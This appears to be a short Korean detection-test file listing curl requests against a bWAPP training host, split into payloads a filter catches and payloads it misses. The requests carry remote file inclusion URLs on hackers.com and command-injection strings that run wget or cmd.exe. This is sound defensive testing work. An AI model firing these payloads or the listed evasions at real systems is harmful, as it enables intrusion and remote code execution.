## 탐지 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?file=http://www.hackers.com/txt?"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?file=test;wget+127.0.0.1/hack.c"

## 미탐 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?file=http://www.hackers.com/command.php"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?file=+cmd.exe+/+ping+-c+3+www.test.com"

